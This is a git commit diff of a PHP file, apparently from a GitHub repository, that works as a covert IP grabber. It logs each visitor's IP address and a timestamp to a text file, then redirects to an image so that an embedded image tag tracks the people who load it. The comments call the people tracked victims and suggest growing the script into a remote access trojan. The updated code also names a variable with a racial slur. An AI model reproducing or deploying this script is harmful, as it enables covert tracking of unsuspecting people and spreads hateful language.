0064aa0a4333b2ea90852120503fd143ff016067
p1d0r4s <153553100+p1d0r4s@users.noreply.github.com>
2023-12-15 19:46:02 +0500

    Update index.php

--- index.php
+++ index.php
@@ -1,12 +1,8 @@
 <?php
-// set ur shit urself i wont teach u ez things, can be remaked into something very big like launching apps on victim's pc, and even rat.
-$filename = 'logss.txt'; // will create a txt file with that name
-
-$ip = $_SERVER['REMOTE_ADDR']; // gets ip
-
-$content = "$ip | " . date('Y-m-d H:i:s') . PHP_EOL; // content that will be in the txt
-file_put_contents($filename, $content, FILE_APPEND);
-
-header('Location: gnegrila.png'); // after grabbing ips will redirect u to the png so the "img src=" would work
-exit();
+// set ur shit urself i wont teach u ez things
+$eblan = 'logss.txt'; // will create a txt file with that name
+$passwords_nad_niggers = $_SERVER['REMOTE_ADDR']; // gets ip
+$content = "$passwords_nad_niggers | " . date('Y-m-d H:i:s') . PHP_EOL; // content that will be in the txt
+file_put_contents($eblan, $content, FILE_APPEND);
+header('Location: gnegrila.png'); // after grabbing ips will redirect u to the png so the "img src=" will work
 ?>
